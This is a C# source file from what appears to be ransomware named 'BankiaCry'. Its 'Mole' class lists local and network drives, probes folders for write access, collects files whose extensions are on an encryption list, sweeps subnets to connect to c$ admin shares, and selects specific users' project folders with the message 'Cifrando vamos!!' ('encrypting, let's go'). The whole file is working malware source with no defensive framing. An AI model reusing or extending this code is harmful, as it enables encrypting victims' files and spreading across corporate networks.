using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BankiaCry;

internal class Mole
{
	[StructLayout(LayoutKind.Sequential)]
	private class NETRESOURCE
	{
		public int dwScope = 0;

		public int dwType = 0;

		public int dwDisplayType = 0;

		public int dwUsage = 0;

		public string lpLocalName = "";

		public string lpRemoteName = "";

		public string lpComment = "";

		public string lpProvider = "";
	}

	public ConcurrentBag<string> _writableFolders { get; set; }

	public ConcurrentBag<string> _interestingFiles { get; set; }

	public List<DriveInfo> _networkMappedDrives { get; set; }

	public List<DriveInfo> _localMappedDrives { get; set; }

	public Hashtable _userStuff { get; set; }

	[DllImport("Mpr.dll", CharSet = CharSet.Auto)]
	private static extern double WNetUseConnectionA(IntPtr hwndOwner, NETRESOURCE lpNetResource, string lpPassword, string lpUserID, int dwFlags, string lpAccessName, string lpBufferSize, string lpResult);

	[DllImport("Mpr.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int WNetGetConnection([MarshalAs(UnmanagedType.LPTStr)] string localName, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder remoteName, ref int length);

	public Mole()
	{
		_networkMappedDrives = new List<DriveInfo>();
		_localMappedDrives = new List<DriveInfo>();
		_writableFolders = new ConcurrentBag<string>();
		_interestingFiles = new ConcurrentBag<string>();
		_userStuff = new Hashtable();
	}

	public DriveInfo[] GetMappedDrives()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType.Equals(DriveType.Network))
			{
				_networkMappedDrives.Add(driveInfo);
			}
			else if (driveInfo.DriveType.Equals(DriveType.Fixed))
			{
				_localMappedDrives.Add(driveInfo);
			}
			else if (!driveInfo.DriveType.Equals(DriveType.Removable) && false)
			{
				_localMappedDrives.Add(driveInfo);
			}
		}
		return drives;
	}

	public static bool IsNetworkPath(string path)
	{
		string pathRoot = Path.GetPathRoot(path);
		DriveInfo driveInfo = new DriveInfo(pathRoot);
		return driveInfo.DriveType == DriveType.Network;
	}

	public static string NormalizePath(string path)
	{
		return Path.GetFullPath(new Uri(path).LocalPath).TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar).ToUpperInvariant();
	}

	public static string GetUNCPath(string originalPath)
	{
		StringBuilder stringBuilder = new StringBuilder(512);
		int length = stringBuilder.Capacity;
		if (WNetGetConnection(originalPath.Substring(0, 2), stringBuilder, ref length) != 0)
		{
			Marshal.GetLastWin32Error();
		}
		return stringBuilder.ToString();
	}

	public ConcurrentBag<string> GetWritableDirectories(string path)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			_ = (string)GetUserStuff()["USERNAME"];
			Parallel.ForEach(directoryInfo.GetDirectories(), delegate(DirectoryInfo d)
			{
				d.Attributes.ToString();
				if (iLikeFolder(d))
				{
					if (IsNetworkPath(path))
					{
						string uNCPath = GetUNCPath(path);
						if (NormalizePath(uNCPath).ToUpper().Contains("localhost".ToUpper()))
						{
							Console.WriteLine("Network path: " + uNCPath);
							_writableFolders.Add(d.FullName);
						}
					}
					else
					{
						_writableFolders.Add(d.FullName);
					}
				}
			});
		}
		catch (Exception)
		{
		}
		return _writableFolders;
	}

	public bool iLikeFolder(DirectoryInfo folder)
	{
		string text = folder.Attributes.ToString();
		return !text.Contains("ReparsePoint") && !text.Contains("System") && IsWritableFolder(folder.FullName);
	}

	public static HashSet<string> GetInterestingUniqueFiles(string directory_path, SearchOption searchOption)
	{
		HashSet<string> hashSet = new HashSet<string>();
		if (searchOption == SearchOption.AllDirectories)
		{
			try
			{
				IEnumerable<string> enumerable = Directory.EnumerateDirectories(directory_path);
				foreach (string item in enumerable)
				{
					HashSet<string> interestingUniqueFiles = GetInterestingUniqueFiles(item, SearchOption.AllDirectories);
					hashSet.UnionWith(interestingUniqueFiles);
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (PathTooLongException)
			{
			}
		}
		try
		{
			IEnumerable<string> source = Directory.EnumerateFiles(directory_path);
			source = source.Where((string f) => Config.GetExtensionsToEncrypt().Contains(Path.GetExtension(f)));
			hashSet.UnionWith(from f in Directory.EnumerateFiles(directory_path, "*.*")
				where Config.GetExtensionsToEncrypt().Contains(Path.GetExtension(f))
				select f);
		}
		catch (UnauthorizedAccessException)
		{
		}
		return hashSet;
	}

	public Hashtable GetUserStuff()
	{
		_userStuff = (Hashtable)Environment.GetEnvironmentVariables();
		return _userStuff;
	}

	public bool IsWritableFolder(string path)
	{
		byte[] array = new byte[10];
		new Random().NextBytes(array);
		string text = Convert.ToBase64String(array).Replace("=", "").Replace("/", "")
			.Replace("+", "");
		try
		{
			string path2 = path + "\\" + text;
			FileStream fileStream = new FileStream(path2, FileMode.CreateNew);
			fileStream.Flush();
			fileStream.Close();
			File.Delete(path2);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private void TouchNetwork(object Addresses)
	{
		int[] source = Enumerable.Range(1, 254).ToArray();
		foreach (string network in (List<string>)Addresses)
		{
			NETRESOURCE nresource = new NETRESOURCE();
			Parallel.ForEach(source, delegate(int i)
			{
				string text = network + "." + i;
				nresource.lpRemoteName = "\\\\" + text + "\\c$";
				ConnectToShare(nresource);
			});
		}
	}

	private void ConnectToShare(NETRESOURCE nresource)
	{
		WNetUseConnectionA(IntPtr.Zero, nresource, null, null, 0, null, null, null);
	}

	public List<string> Dig()
	{
		GetWritableDirectories((string)GetUserStuff()["USERPROFILE"]);
		GetMappedDrives();
		foreach (DriveInfo networkMappedDrife in _networkMappedDrives)
		{
			GetWritableDirectories(networkMappedDrife.Name);
		}
		string whoami = Environment.UserName;
		Parallel.ForEach(_writableFolders, delegate(string d)
		{
			foreach (string interestingUniqueFile in GetInterestingUniqueFiles(d, SearchOption.AllDirectories))
			{
				if (IsNetworkPath(interestingUniqueFile))
				{
					if (GetUNCPath(interestingUniqueFile).ToUpper().Contains(Config.cpindado_unc) && string.Equals(whoami, Config.cpindado))
					{
						if (NormalizePath(interestingUniqueFile).ToUpper().Contains("NuevoProyectoOutsourcing".ToUpper()))
						{
							Console.WriteLine("Cifrando vamos!!: " + interestingUniqueFile);
							_interestingFiles.Add(interestingUniqueFile);
						}
					}
					else if (GetUNCPath(interestingUniqueFile).ToUpper().Contains(Config.gfernandezm_unc) && string.Equals(whoami, Config.gfernandezm) && (NormalizePath(interestingUniqueFile).ToUpper().Contains("Informes TV y Radio".ToUpper()) || NormalizePath(interestingUniqueFile).ToUpper().Contains("Proyectos estratégicos".ToUpper())))
					{
						Console.WriteLine("Cifrando vamos!!: " + interestingUniqueFile);
						_interestingFiles.Add(interestingUniqueFile);
					}
				}
				else
				{
					_interestingFiles.Add(interestingUniqueFile);
				}
			}
		});
		return _interestingFiles.ToList();
	}
}
